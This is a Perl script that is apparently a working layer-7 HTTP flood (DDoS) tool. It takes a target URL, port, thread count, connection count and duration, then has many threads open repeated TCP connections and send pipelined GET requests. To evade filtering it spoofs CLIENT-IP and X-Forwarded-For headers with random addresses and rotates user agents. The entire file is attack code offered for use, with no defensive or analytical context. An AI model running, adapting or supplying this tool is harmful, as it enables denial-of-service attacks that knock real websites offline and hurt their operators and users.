#!/usr/bin/perl
package control;

my $ip;

sub new {
    my ( $class, $i ) = @_;
    $ip = $i;
    my $self = {};
    $ip = $i;
    bless $self, $class;
    return $self;
}

sub mas {
    my ( $self, $veces ) = @_;
    $veces = 1 if ( $veces eq "" );
    my ( $a, $e, $o, $b ) = split( /\./, $ip );
    for ( $as = 0 ; $as < $veces ; $as++ ) {
        $b++;
        if ( $b >= 255 ) { $b = 0; $o++; }
        if ( $o >= 255 ) { $o = 0; $e++; }
        if ( $e >= 255 ) { $e = 0; $a++; }
        die("No mas IPs!\n") if ( $a >= 255 );
    }
    $ip = join "", $a, ".", $e, ".", $o, ".", $b;
    return $ip;
}

1;

package main;

use Socket;
use IO::Socket::INET;
use threads (
    'yield',
    'exit' => 'threads_only',
    'stringify'
);
use threads::shared;

my $ua = "Mozilla/5.0 (X11; DDoS Rekt Kid; rv:5.0) Gecko/20100101 Firefox/5.0";
my $ua = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)";
my $ua = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)";
my $ua = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00";
my $ua = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00";
my $ua = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00";
my $ua = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01";
my $method = "GET";
my $hilo;
my @vals = (
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l',
    'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'w', 'x', 'y', 'z',
    0,   1,   2,   3,   4,   5,   6,   7,   8,   9
);
my $randsemilla = "";

for ( $i = 0 ; $i < 30 ; $i++ ) {
    $randsemilla .= $vals[ int( rand($#vals) ) ];
}

sub randomip
{
    my @digits;
    for (0..3) {
        push @digits, int (rand (255) + 1);
    }
    return join '.', @digits;
}

sub socker {
    my ( $remote, $port ) = @_;
    my ( $iaddr, $paddr, $proto );
    $iaddr = inet_aton($remote) || return false;
    $paddr = sockaddr_in( $port, $iaddr ) || return false;
    $proto = getprotobyname('tcp');
    socket( SOCK, PF_INET, SOCK_STREAM, $proto );
    connect( SOCK, $paddr ) || return false;
    return SOCK;
}

sub sender {
    $SIG{'killthread'} = sub { print "Killed thread...\n"; threads->exit };
    my ( $connections, $peerto, $host, $file, $time ) = @_;
    my $sock;
    $endtime = time() + ($time ? $time : 1000000);
    for (;time() <= $endtime;) {
        my $packet = "";
        $sock = IO::Socket::INET->new(
            PeerAddr => $host,
            PeerPort => $peerto,
            Proto    => 'tcp'
        );
        unless ($sock) {
            print "\n[x] Unable to connect...\n\n";
            sleep(1);
            next;
        }
        for ( $i = 0 ; $i < $connections; $i++ ) {
            $ipinicial = randomip();
            my $filepath = $file;
            $filepath =~ s/(\{mn\-fakeip\})/$ipinicial/g;
            $packet .= join "", $method, " /", $filepath,
              " HTTP/1.1\r\nHost: ", $host, "\r\nUser-Agent: ", $ua,
              "\r\nCLIENT-IP: ", $ipinicial, "\r\nX-Forwarded-For: ",
              $ipinicial, "\r\nIf-None-Match: ", $randsemilla,
"\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
        }
        $packet =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Close\r\n\r\n/;
        print $sock $packet;
    }
}

sub sender2 {
    my ( $peerto, $host, $packet ) = @_;
    my $sock;
    my $sumador : shared;
    while (true) {
        $sock = &socker( $host, $peerto );
        unless ($sock) {
            print "\n[x] Unable to connect...\n\n";
            next;
        }
        print $sock $packet;
    }
}

sub layer7 {
    $url         = $ARGV[0];
    $peerto      = $ARGV[1];
    $threads     = $ARGV[2];
    $connections = $ARGV[3];
    $time        = $ARGV[4];

    $ipfake      = "192.168.0";
    print "Opening Sockets\n";

    if ( $url !~ /^https?:\/\// ) {
        die("[x] Invalid URL!\n");
    }
    $url .= "/" if ( $url =~ /^https?:\/\/([\d\w\:\.-]*)$/ );
    ( $host, $file ) = ( $url =~ /^https?:\/\/(.*?)\/(.*)/ );
    ( $host, $peerto ) = ( $host =~ /(.*?):(.*)/ ) if ( $host =~ /(.*?):(.*)/ );
    $file =~ s/\s/ /g;
    $file = "/" . $file if ( $file !~ /^\// );
    print join "", "";
    $sumador = control->new($ipfake);
    for ( $v = 0 ; $v < $threads ; $v++ ) {
        $thr[$v] = threads->create( 'sender',
            ( $connections, $peerto, $host, $file, $time ) );
    }
    print "[-] Launched!\n";
    # for ( $v = 0 ; $v < $max ; $v++ ) {
    #     if ( $thr[$v]->is_running() ) {
    #         sleep(3);
    #         $v--;
    #     }
    # } 
    sleep($time+1);
    for ( $v = 0 ; $v < $max ; $v++ ) {
       # if ( $thr[$v]->is_running() ) {
            $thr[$v]->kill('killthread')->detach;
       # }
    }
    print "[!] Finished!\n";
}

if ( $#ARGV > 2 ) {
    layer7();
}
else {
    die("Usage: http.pl <url> <port> <threads> <connections> <time>\n");
}
